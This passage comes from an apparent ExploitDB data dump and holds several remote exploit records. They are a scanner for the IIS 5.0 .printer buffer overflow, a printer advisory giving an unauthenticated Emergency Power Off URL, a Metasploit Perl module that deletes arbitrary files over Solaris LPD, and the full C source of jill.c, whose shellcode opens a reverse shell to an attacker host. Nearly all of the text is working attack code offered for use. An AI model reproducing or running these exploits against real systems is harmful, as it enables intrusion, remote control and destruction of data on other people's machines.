finip[16];\r\n        struct tm *t;\r\n        char *sep = "+-------------------------------------------------------+\\n\\n\\n";\r\n        time_t s, iniz, fini;\r\n\r\n        memset(initip, 0x0, 16);\r\n        memset(finip, 0x0, 16);\r\n\r\n\r\n        if ( argn < 4 ) {\r\n\r\n                author();\r\n                printf("\\n\\nUse: %s <initial_ip> <final_ip> <log_file>\\n", argv[0]);\r\n                printf("\\nExample.\\n%s 127.0.0.1 127.0.0.4 scan.log\\n\\n\\n", argv[0]);\r\n                exit(0);\r\n        }\r\n\r\n        time(&iniz);\r\n\r\n        if((f = fopen(argv[3], "a")) == NULL) {\r\n                printf("Error occured when I try to open file %s\\n", argv[3]);\r\n        }\r\n\r\n        z++;\r\n        printf("\\nNow the checker will write the result of scan in %s in your local directory..\\n\\n", argv[3]);\r\n        write_file("+-------------------------------------------------------+\\n| ");\r\n        s = time(NULL);\r\n        write_file(asctime(localtime(&s)));\r\n        write_file("+-------------------------------------------------------+\\n|\\n");\r\n        sleep(1);\r\n\r\n\r\n        author();\r\n        sleep(2);\r\n        separe(argv[1],argv[2]);\r\n\r\n        sprintf(finip,"%d.%d.%d.%d",a,b,c,d);\r\n\r\n        while(1) {\r\n\r\n                sprintf(initip, "%d.%d.%d.%d", i, j, k, l);\r\n                printf("\\n\\n\\nI\'m connecting to: %s\\n", initip);\r\n\r\n                scan(initip);\r\n\r\n                if ( strcmp(initip, finip) == 0) {\r\n                write_file("|");\r\n                break;\r\n                }\r\n\r\n                l++;\r\n\r\n                if ( l == 256) {\r\n                        l = 0;\r\n                        k++;\r\n                        if ( k == 256) {\r\n                                k = 0;\r\n                                j++;\r\n                                        if (j == 256) {\r\n                                                j = 0;\r\n                                                i++;\r\n                                        }\r\n                        }\r\n                }\r\n\r\n\r\n        }\r\n\r\n        time(&fini);\r\n\r\n        printf("\\n*************************\\n");\r\n\r\n        printf("\\nSCAN FINISHED! in %d sec\\n\\n", fini - iniz);\r\n\r\n        if( z > 0 ) {\r\n\r\n                printf("You can view the file %s to see quietly scan\'s results..\\n\\n", argv[3]);\r\n                fprintf(f, "\\n%s\\n", sep);\r\n\r\n        }\r\n\r\n        return 0;\r\n        fclose(f);\r\n\r\n}\r\n\r\n\r\nvoid separe(char *ip,char *ip2) {\r\n\r\n        char *t = \'\\0\';\r\n        int f = 0;\r\n\r\n        t = strtok(ip,".");\r\n        i = atoi(t);\r\n\r\n        while( t != NULL) {\r\n\r\n                t = strtok(NULL, ".");\r\n                f++;\r\n                if ( f == 1) j = atoi(t);\r\n                else if (f == 2) k = atoi(t);\r\n                else if (f == 3) l = atoi(t);\r\n\r\n        }\r\n\r\n        t = \'\\0\';\r\n        f = 0;\r\n\r\n        t = strtok(ip2,".");\r\n        a = atoi(t);\r\n\r\n        while( t != NULL) {\r\n\r\n                t = strtok(NULL, ".");\r\n                f++;\r\n                if ( f == 1) b = atoi(t);\r\n                else if (f == 2) c = atoi(t);\r\n                else if (f == 3) d = atoi(t);\r\n\r\n                }\r\n\r\n        return;\r\n\r\n}\r\n\r\n\r\nvoid scan(char *ip) {\r\n\r\n        int sock, risp;\r\n        struct sockaddr_in web;\r\n        char buf[50];\r\n        int i = 0;\r\n\r\n        if( (sock = socket(AF_INET,SOCK_STREAM,0)) < 0 ) {\r\n\r\n                printf("Error occured when I try to create socket\\n");\r\n                perror("sock:");\r\n\r\n        }\r\n\r\n        web.sin_family = AF_INET;\r\n        web.sin_port = htons(PORTA);\r\n        web.sin_addr.s_addr = inet_addr(ip);\r\n\r\n        if( connect(sock, (struct sockaddr *)&web, sizeof(web)) < 0 ) {\r\n\r\n                printf("I can\'t connect to %s..is it online?\\n", ip);\r\n                perror("connect: ");\r\n\r\n        }\r\n\r\n        printf("Ok..I\'m sending the string...");\r\n\r\n        risp = result(sock);\r\n\r\n        if( risp == 0 ) {\r\n\r\n                printf("The server %s is vulnerable...i think that you have to install a patch! :)\\n\\n", ip);\r\n\r\n                if ( z > 0 ) {\r\n\r\n                        sprintf(buf, "| The server %s is vulnerable.!\\n", ip);\r\n                        write_file(buf);\r\n\r\n                        for( i = 0; i < 50; i++ ) {\r\n                                buf[i] = \'\\0\';\r\n                        }\r\n                }\r\n\r\n        } else {\r\n\r\n                printf("I\'m sorry: the server %s is not vulnerable..change target\\n", ip);\r\n\r\n                if ( z > 0 ) {\r\n\r\n                        sprintf(buf, "| I\'m sorry:the server %s is not vulnerable.\\n", ip);\r\n                        write_file(buf);\r\n\r\n                        for( i = 0; i < 50; i++ ) {\r\n                                buf[i] = \'\\0\';\r\n                        }\r\n                }\r\n        }\r\n\r\n        sleep(1);\r\n        close(sock);\r\n        return;\r\n\r\n}\r\n\r\n\r\nint result(int sock) {\r\n\r\n        char *expl = "GET /NULL.printer HTTP/1.0\\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\\n";\r\n        char buf[1024];\r\n        int i = 0;\r\n\r\n        for ( i = 0; i< 1024; i++) {\r\n                buf[i] = \'\\0\';\r\n        }\r\n\r\n        if( write(sock, expl, strlen(expl)) == -1) {\r\n\r\n                printf("Error occured when I try to send exploit...\\n");\r\n                perror("write: ");\r\n        }\r\n\r\n        if( read(sock, buf, sizeof(buf)) == -1) {\r\n\r\n                printf("Error occured when I try to read from sock...\\n");\r\n                perror("read: ");\r\n\r\n        }\r\n\r\n        if( buf == NULL) {\r\n                return 0;\r\n        } else {\r\n\r\n        return -1;\r\n\r\n        }\r\n}\r\n\r\nvoid write_file(char *buf) {\r\n\r\n        fprintf(f, "%s", buf);\r\n\r\n        return;\r\n\r\n}\r\n\r\nvoid author() {\r\n\r\nprintf("\\n\\n\\n");\r\nprintf("+--------------------------------------------+\\n");\r\nprintf("|                                            |\\n");\r\nprintf("|             styx^ checker for              |\\n");\r\nprintf("|   IIS 5.0 sp1 sp2 ISAPI Buffer Overflows   |\\n");\r\nprintf("|                                            |\\n");\r\nprintf("+--------------------------------------------+\\n\\n");\r\n\r\n}', u'description': u"Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (3)", u'platform': u'windows', u'author': u'styx', u'cve': [], u'source': u'ExploitDB', u'date': u'2005-02-02T00:00:00+00:00', u'_id': 20817, u'type': u'remote', u'port': 0}

CVE: []
Description: Tektronix Phaser 740/750/850/930 - Network Printer Administration Interface
{u'code': u'source: http://www.securityfocus.com/bid/2659/info\r\n\r\nA remote vulnerability exists in Tektronix Phaser network printers in the 7xx, 8xx, and 9xx series.\r\n\r\nAn attacker with access to the printer\'s local network (or, if no firewall is in place, any attacker) can reach the printer\'s admin interface, supported by the inbuilt Tektronix PhaserLink webserver.\r\n\r\nNo authentication is applied to this connection. Arbitrary pages inside the printer\'s administration interface may be accessed by specifying the desired page in a querystring submitted to the PhaserLink webserver.\r\n\r\nNo password or other authentication method prevent arbitrary users from making use of this interface.\r\n\r\nUsing this method, an attacker can activate the printer\'s \'Emergency Power Off\' feature.\r\n\r\nThis can lead to improper cooling of the ink/crayon reservoir, physically damaging the device.\r\n\r\n* The vendor has reported that the printer properly handles \'Emergency Power Off\' situations, and that physical damage is unachievable.\r\n\r\nSubmit http://printername/_ncl_items.shtml&SUBJECT=1\r\n\r\nSelect "Shutdown" option = "Emergency Power Off".', u'description': u'Tektronix Phaser 740/750/850/930 - Network Printer Administration Interface', u'platform': u'hardware', u'author': u'Ltlw0lf', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-04-25T00:00:00+00:00', u'_id': 20806, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (4)
{u'code': u"source: http://www.securityfocus.com/bid/2674/info\r\n  \r\nWindows 2000 Internet printing ISAPI extension contains msw3prt.dll which handles user requests. Due to an unchecked buffer in msw3prt.dll, a maliciously crafted HTTP .printer request containing approx 420 bytes in the 'Host:' field will allow the execution of arbitrary code. Typically a web server would stop responding in a buffer overflow condition; however, once Windows 2000 detects an unresponsive web server it automatically performs a restart. Therefore, the administrator will be unaware of this attack.\r\n  \r\n* If Web-based Printing has been configured in group policy, attempts to disable or unmap the affected extension via Internet Services Manager will be overridden by the group policy settings. \r\n\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20818.zip", u'description': u"Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (4)", u'platform': u'windows', u'author': u'Cyrus The Great', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-05-01T00:00:00+00:00', u'_id': 20818, u'type': u'remote', u'port': 0}

CVE: []
Description: Solaris 10 LPD - Arbitrary File Delete (Metasploit)
{u'code': u'##\r\n# This file is part of the Metasploit Framework and may be redistributed\r\n# according to the licenses defined in the Authors field below. In the\r\n# case of an unknown or missing license, this file defaults to the same\r\n# license as the core Framework (dual GPLv2 and Artistic). The latest\r\n# version of the Framework can always be obtained from metasploit.com.\r\n##\r\n\r\npackage Msf::Exploit::solaris_lpd_unlink;\r\nuse base "Msf::Exploit";\r\nuse IO::Socket;\r\nuse IO::Select;\r\nuse strict;\r\nuse Pex::Text;\r\n\r\nmy $advanced = { };\r\n\r\nmy $info =\r\n  {\r\n\t\'Name\'\t\t=> \'Solaris LPD Arbitrary File Delete\',\r\n\t\'Version\'\t=> \'$Revision: 1.6 $\',\r\n\t\'Authors\'\t=>\r\n\t  [\r\n\t\t\'H D Moore <hdm [at] metasploit.com>\',\r\n\t\t\'Optyx <optyx [at] uberhax0r.net>\'\r\n\t  ],\r\n\r\n\t\'Arch\'\t\t=> [ ],\r\n\t\'OS\'\t\t=> [ \'solaris\' ],\r\n\r\n\t\'UserOpts\'  =>\r\n\t  {\r\n\t\t\'RHOST\' => [1, \'ADDR\', \'The target address\'],\r\n\t\t\'RPORT\' => [1, \'PORT\', \'The LPD server port\', 515],\r\n\t\t\'RPATH\' => [1, \'DATA\', \'The remote path name to delete\'],\r\n\t  },\r\n\r\n\t\'Description\'  => Pex::Text::Freeform(qq{\r\n\t\tThis module uses a vulnerability in the Solaris line printer daemon\r\n\tto delete arbitrary files on an affected system. This can be used to exploit\r\n\tthe rpc.walld format string flaw, the missing krb5.conf authentication bypass,\r\n\tor simple delete system files. Tested on Solaris 2.6, 7, 8, 9, and 10. \r\n}),\r\n\r\n\t\'Refs\'  =>\r\n\t  [\r\n\t\t[\'URL\', \'http://sunsolve.sun.com/search/document.do?assetkey=1-26-101842-1\'],\r\n\t  ],\r\n\r\n\t\'DefaultTarget\' => 0,\r\n\t\'Targets\' => [[\'No Target Needed\']],\r\n\r\n\t\'Keys\'  => [\'lpd\'],\r\n  };\r\n\r\nsub new {\r\n\tmy $class = shift;\r\n\tmy $self = $class->SUPER::new({\'Info\' => $info, \'Advanced\' => $advanced}, @_);\r\n\treturn($self);\r\n}\r\n\r\nsub Exploit {\r\n\tmy $self = shift;\r\n\tmy $target_host = $self->GetVar(\'RHOST\');\r\n\tmy $target_port = $self->GetVar(\'RPORT\');\r\n\tmy $target_path = $self->GetVar(\'RPATH\');\r\n\tmy $res;\r\n\r\n\t# We use one connection to configure the spool directory\r\n\tmy $s = Msf::Socket::Tcp->new\r\n\t  (\r\n\t\t\'PeerAddr\'  => $target_host,\r\n\t\t\'PeerPort\'  => $target_port,\r\n\t\t\'LocalPort\' => $self->GetVar(\'CPORT\'),\r\n\t\t\'SSL\'       => $self->GetVar(\'SSL\'),\r\n\t  );\r\n\tif ($s->IsError) {\r\n\t\t$self->PrintLine(\'[*] Error creating socket: \' . $s->GetError);\r\n\t\treturn;\r\n\t}\r\n\r\n\t# Send a job request that will trigger the cascade adaptor (thanks Dino!)\r\n\t$s->Send("\\x02"."metasploit:framework\\n");\r\n\t$res = $s->Recv(1, 5);\r\n\tif (ord($res) != 0) {\r\n\t\t$self->PrintLine("[*] The target did not accept our job request command");\r\n\t\treturn;\r\n\t}\r\n\r\n\t# The job ID is squashed down to three decimal digits\r\n\tmy $jid = ($$ % 1000).unpack("H*",pack(\'N\', time() + $$));\r\n\r\n\t# Create a simple control file...\r\n\tmy $control = "Hmetasploit\\nPr00t\\n";\r\n\r\n\t# Theoretically, we could delete multiple files at once, however\r\n\t# the lp daemon will append garbage from memory to the path name\r\n\t# if we don\'t stick a null byte after the path. Unfortunately, this\r\n\t# null byte will prevent the parser from processing the other paths.\r\n\t$control .= "U".("../" x 10)."$target_path\\x00\\n";\r\n\r\n\tmy $dataf = "http://metasploit.com/\\n";\r\n\r\n\t$self->PrintLine("[*] Sending the malicious cascaded job request...");\r\n\tif ( ! $self->SendFile($s, 2, "cfA".$jid."metasploit", $control) ||\r\n\t\t! $self->SendFile($s, 3, "dfa".$jid."metasploit", $dataf)  ||\r\n\t\t0\r\n\t  ) { $s->Close; return }\r\n\r\n\t$self->PrintLine(\'\');\r\n\t$self->PrintLine("[*] Successfully deleted $target_path >:-]");\r\n\treturn;\r\n}\r\n\r\nsub SendFile {\r\n\tmy $self = shift;\r\n\tmy $sock = shift;\r\n\tmy $type = shift;\r\n\tmy $name = shift;\r\n\tmy $data = shift;\r\n\r\n\t$sock->Send(chr($type) .length($data). " $name\\n");\r\n\tmy $res = $sock->Recv(1, 5);\r\n\tif (ord($res) != 0) {\r\n\t\t$self->PrintLine("[*] The target did not accept our control file command ($name)");\r\n\t\treturn;\r\n\t}\r\n\r\n\t$sock->Send($data);\r\n\t$sock->Send("\\x00");\r\n\t$res = $sock->Recv(1, 5);\r\n\tif (ord($res) != 0) {\r\n\t\t$self->PrintLine("[*] The target did not accept our control file data ($name)");\r\n\t\treturn;\r\n\t}\r\n\r\n\t$self->PrintLine(sprintf("[*]     Uploaded %.4d bytes >> $name", length($data)));\r\n\treturn 1;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2005-08-19]', u'description': u'Solaris 10 LPD - Arbitrary File Delete (Metasploit)', u'platform': u'solaris', u'author': u'Optyx', u'cve': [], u'source': u'ExploitDB', u'date': u'2005-08-19T00:00:00+00:00', u'_id': 1167, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft Windows Server 2000 SP1/SP2 - isapi .printer Extension Overflow (2)
{u'code': u'/* IIS 5 remote .printer overflow. "jill.c" (don\'t ask).\r\n *\r\n *  by: dark spyrit <dspyrit@beavuh.org>\r\n *\r\n *  respect to eeye for finding this one - nice work.\r\n *  shouts to halvar, neofight and the beavuh bitchez.\r\n *\r\n *  this exploit overwrites an exception frame to control eip and get to\r\n *  our code.. the code then locates the pointer to our larger buffer and\r\n *  execs.\r\n *\r\n *  usage: jill <victim host> <victim port> <attacker host> <attacker port>\r\n *\r\n *  the shellcode spawns a reverse cmd shell.. so you need to set up a\r\n *  netcat listener on the host you control.\r\n *\r\n *  Ex: nc -l -p <attacker port> -vv\r\n *\r\n *  I haven\'t slept in years.\r\n */\r\n\r\n#include <sys/types.h>\r\n#include <sys/time.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n#include <unistd.h>\r\n#include <errno.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <fcntl.h>\r\n#include <netdb.h>\r\n\r\nint main(int argc, char *argv[]){\r\n\r\n/* the whole request rolled into one, pretty huh? carez. */\r\n\r\nunsigned char sploit[]=\r\n  "\\x47\\x45\\x54\\x20\\x2f\\x4e\\x55\\x4c\\x4c\\x2e\\x70\\x72\\x69\\x6e\\x74\\x65\\x72\\x20"\r\n  "\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0d\\x0a\\x42\\x65\\x61\\x76\\x75\\x68\\x3a\\x20"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\xeb\\x03\\x5d\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x83\\xc5\\x15\\x90\\x90\\x90"\r\n  "\\x8b\\xc5\\x33\\xc9\\x66\\xb9\\xd7\\x02\\x50\\x80\\x30\\x95\\x40\\xe2\\xfa\\x2d\\x95\\x95"\r\n  "\\x64\\xe2\\x14\\xad\\xd8\\xcf\\x05\\x95\\xe1\\x96\\xdd\\x7e\\x60\\x7d\\x95\\x95\\x95\\x95"\r\n  "\\xc8\\x1e\\x40\\x14\\x7f\\x9a\\x6b\\x6a\\x6a\\x1e\\x4d\\x1e\\xe6\\xa9\\x96\\x66\\x1e\\xe3"\r\n  "\\xed\\x96\\x66\\x1e\\xeb\\xb5\\x96\\x6e\\x1e\\xdb\\x81\\xa6\\x78\\xc3\\xc2\\xc4\\x1e\\xaa"\r\n  "\\x96\\x6e\\x1e\\x67\\x2c\\x9b\\x95\\x95\\x95\\x66\\x33\\xe1\\x9d\\xcc\\xca\\x16\\x52\\x91"\r\n  "\\xd0\\x77\\x72\\xcc\\xca\\xcb\\x1e\\x58\\x1e\\xd3\\xb1\\x96\\x56\\x44\\x74\\x96\\x54\\xa6"\r\n  "\\x5c\\xf3\\x1e\\x9d\\x1e\\xd3\\x89\\x96\\x56\\x54\\x74\\x97\\x96\\x54\\x1e\\x95\\x96\\x56"\r\n  "\\x1e\\x67\\x1e\\x6b\\x1e\\x45\\x2c\\x9e\\x95\\x95\\x95\\x7d\\xe1\\x94\\x95\\x95\\xa6\\x55"\r\n  "\\x39\\x10\\x55\\xe0\\x6c\\xc7\\xc3\\x6a\\xc2\\x41\\xcf\\x1e\\x4d\\x2c\\x93\\x95\\x95\\x95"\r\n  "\\x7d\\xce\\x94\\x95\\x95\\x52\\xd2\\xf1\\x99\\x95\\x95\\x95\\x52\\xd2\\xfd\\x95\\x95\\x95"\r\n  "\\x95\\x52\\xd2\\xf9\\x94\\x95\\x95\\x95\\xff\\x95\\x18\\xd2\\xf1\\xc5\\x18\\xd2\\x85\\xc5"\r\n  "\\x18\\xd2\\x81\\xc5\\x6a\\xc2\\x55\\xff\\x95\\x18\\xd2\\xf1\\xc5\\x18\\xd2\\x8d\\xc5\\x18"\r\n  "\\xd2\\x89\\xc5\\x6a\\xc2\\x55\\x52\\xd2\\xb5\\xd1\\x95\\x95\\x95\\x18\\xd2\\xb5\\xc5\\x6a"\r\n  "\\xc2\\x51\\x1e\\xd2\\x85\\x1c\\xd2\\xc9\\x1c\\xd2\\xf5\\x1e\\xd2\\x89\\x1c\\xd2\\xcd\\x14"\r\n  "\\xda\\xd9\\x94\\x94\\x95\\x95\\xf3\\x52\\xd2\\xc5\\x95\\x95\\x18\\xd2\\xe5\\xc5\\x18\\xd2"\r\n  "\\xb5\\xc5\\xa6\\x55\\xc5\\xc5\\xc5\\xff\\x94\\xc5\\xc5\\x7d\\x95\\x95\\x95\\x95\\xc8\\x14"\r\n  "\\x78\\xd5\\x6b\\x6a\\x6a\\xc0\\xc5\\x6a\\xc2\\x5d\\x6a\\xe2\\x85\\x6a\\xc2\\x71\\x6a\\xe2"\r\n  "\\x89\\x6a\\xc2\\x71\\xfd\\x95\\x91\\x95\\x95\\xff\\xd5\\x6a\\xc2\\x45\\x1e\\x7d\\xc5\\xfd"\r\n  "\\x94\\x94\\x95\\x95\\x6a\\xc2\\x7d\\x10\\x55\\x9a\\x10\\x3f\\x95\\x95\\x95\\xa6\\x55\\xc5"\r\n  "\\xd5\\xc5\\xd5\\xc5\\x6a\\xc2\\x79\\x16\\x6d\\x6a\\x9a\\x11\\x02\\x95\\x95\\x95\\x1e\\x4d"\r\n  "\\xf3\\x52\\x92\\x97\\x95\\xf3\\x52\\xd2\\x97\\x8e\\xac\\x52\\xd2\\x91\\x5e\\x38\\x4c\\xb3"\r\n  "\\xff\\x85\\x18\\x92\\xc5\\xc6\\x6a\\xc2\\x61\\xff\\xa7\\x6a\\xc2\\x49\\xa6\\x5c\\xc4\\xc3"\r\n  "\\xc4\\xc4\\xc4\\x6a\\xe2\\x81\\x6a\\xc2\\x59\\x10\\x55\\xe1\\xf5\\x05\\x05\\x05\\x05\\x15"\r\n  "\\xab\\x95\\xe1\\xba\\x05\\x05\\x05\\x05\\xff\\x95\\xc3\\xfd\\x95\\x91\\x95\\x95\\xc0\\x6a"\r\n  "\\xe2\\x81\\x6a\\xc2\\x4d\\x10\\x55\\xe1\\xd5\\x05\\x05\\x05\\x05\\xff\\x95\\x6a\\xa3\\xc0"\r\n  "\\xc6\\x6a\\xc2\\x6d\\x16\\x6d\\x6a\\xe1\\xbb\\x05\\x05\\x05\\x05\\x7e\\x27\\xff\\x95\\xfd"\r\n  "\\x95\\x91\\x95\\x95\\xc0\\xc6\\x6a\\xc2\\x69\\x10\\x55\\xe9\\x8d\\x05\\x05\\x05\\x05\\xe1"\r\n  "\\x09\\xff\\x95\\xc3\\xc5\\xc0\\x6a\\xe2\\x8d\\x6a\\xc2\\x41\\xff\\xa7\\x6a\\xc2\\x49\\x7e"\r\n  "\\x1f\\xc6\\x6a\\xc2\\x65\\xff\\x95\\x6a\\xc2\\x75\\xa6\\x55\\x39\\x10\\x55\\xe0\\x6c\\xc4"\r\n  "\\xc7\\xc3\\xc6\\x6a\\x47\\xcf\\xcc\\x3e\\x77\\x7b\\x56\\xd2\\xf0\\xe1\\xc5\\xe7\\xfa\\xf6"\r\n  "\\xd4\\xf1\\xf1\\xe7\\xf0\\xe6\\xe6\\x95\\xd9\\xfa\\xf4\\xf1\\xd9\\xfc\\xf7\\xe7\\xf4\\xe7"\r\n  "\\xec\\xd4\\x95\\xd6\\xe7\\xf0\\xf4\\xe1\\xf0\\xc5\\xfc\\xe5\\xf0\\x95\\xd2\\xf0\\xe1\\xc6"\r\n  "\\xe1\\xf4\\xe7\\xe1\\xe0\\xe5\\xdc\\xfb\\xf3\\xfa\\xd4\\x95\\xd6\\xe7\\xf0\\xf4\\xe1\\xf0"\r\n  "\\xc5\\xe7\\xfa\\xf6\\xf0\\xe6\\xe6\\xd4\\x95\\xc5\\xf0\\xf0\\xfe\\xdb\\xf4\\xf8\\xf0\\xf1"\r\n  "\\xc5\\xfc\\xe5\\xf0\\x95\\xd2\\xf9\\xfa\\xf7\\xf4\\xf9\\xd4\\xf9\\xf9\\xfa\\xf6\\x95\\xc2"\r\n  "\\xe7\\xfc\\xe1\\xf0\\xd3\\xfc\\xf9\\xf0\\x95\\xc7\\xf0\\xf4\\xf1\\xd3\\xfc\\xf9\\xf0\\x95"\r\n  "\\xc6\\xf9\\xf0\\xf0\\xe5\\x95\\xd0\\xed\\xfc\\xe1\\xc5\\xe7\\xfa\\xf6\\xf0\\xe6\\xe6\\x95"\r\n  "\\xd6\\xf9\\xfa\\xe6\\xf0\\xdd\\xf4\\xfb\\xf1\\xf9\\xf0\\x95\\xc2\\xc6\\xda\\xd6\\xde\\xa6"\r\n  "\\xa7\\x95\\xc2\\xc6\\xd4\\xc6\\xe1\\xf4\\xe7\\xe1\\xe0\\xe5\\x95\\xe6\\xfa\\xf6\\xfe\\xf0"\r\n  "\\xe1\\x95\\xf6\\xf9\\xfa\\xe6\\xf0\\xe6\\xfa\\xf6\\xfe\\xf0\\xe1\\x95\\xf6\\xfa\\xfb\\xfb"\r\n  "\\xf0\\xf6\\xe1\\x95\\xe6\\xf0\\xfb\\xf1\\x95\\xe7\\xf0\\xf6\\xe3\\x95\\xf6\\xf8\\xf1\\xbb"\r\n  "\\xf0\\xed\\xf0\\x95\\x0d\\x0a\\x48\\x6f\\x73\\x74\\x3a\\x20\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n  "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x33"\r\n  "\\xc0\\xb0\\x90\\x03\\xd8\\x8b\\x03\\x8b\\x40\\x60\\x33\\xdb\\xb3\\x24\\x03\\xc3\\xff\\xe0"\r\n  "\\xeb\\xb9\\x90\\x90\\x05\\x31\\x8c\\x6a\\x0d\\x0a\\x0d\\x0a";\r\n\r\n  int       s;\r\n  unsigned short int  a_port;\r\n  unsigned long    a_host;\r\n  struct hostent    *ht;\r\n  struct sockaddr_in  sin;\r\n\r\n  printf("iis5 remote .printer overflow.\\n"\r\n    "dark spyrit <dspyrit@beavuh.org> / beavuh labs.\\n");\r\n\r\n  if (argc != 5){\r\n    printf("usage: %s <victimHost> <victimPort> <attackerHost> <attackerPort>\\n",argv[0]);\r\n    exit(1);\r\n  }\r\n  \r\n  if ((ht = gethostbyname(argv[1])) == 0){\r\n    herror(argv[1]);\r\n    exit(1);\r\n  }\r\n  \r\n  sin.sin_port = htons(atoi(argv[2]));\r\n  a_port = htons(atoi(argv[4]));\r\n  a_port^=0x9595;\r\n\r\n  sin.sin_family = AF_INET;\r\n  sin.sin_addr = *((struct in_addr *)ht->h_addr);\r\n  \r\n  if ((ht = gethostbyname(argv[3])) == 0){\r\n    herror(argv[3]);\r\n    exit(1);\r\n  }\r\n  \r\n  a_host = *((unsigned long *)ht->h_addr);\r\n  a_host^=0x95959595;\r\n\r\n  sploit[441]= (a_port) & 0xff;\r\n  sploit[442]= (a_port >> 8) & 0xff;\r\n\r\n  sploit[446]= (a_host) & 0xff;\r\n  sploit[447]= (a_host >> 8) & 0xff;\r\n  sploit[448]= (a_host >> 16) & 0xff;\r\n  sploit[449]= (a_host >> 24) & 0xff;\r\n\r\n  if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){\r\n    perror("socket");\r\n    exit(1);\r\n  }\r\n  \r\n  printf("\\nconnecting... \\n");\r\n  if ((connect(s, (struct sockaddr *) &sin, sizeof(sin))) == -1){\r\n    perror("connect");\r\n    exit(1);\r\n  }\r\n  \r\n  write(s, sploit, strlen(sploit));\r\n  sleep (1);\r\n  close (s);\r\n  \r\n  printf("sent... \\nyou may need to send a carriage on your listener if the shell doesn\'t appear.\\nhave fun!\\n");\r\n  exit(0);\r\n}  \r\n\r\n\r\n// milw0rm.com [2001-05-08]', u'description': u'Microsoft Windows Server 2000 SP1/SP2 - isapi .printer Extension Overflow (2)', u'platform': u'windows', u'author': u'dark spyrit', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-05-08T00:00:00+00:00', u'_id': 268, u'type': u'remote', u'port': 80}

CVE: []
Description: HP HP-UX 10.34 rlpdaemon - Remote Overflow
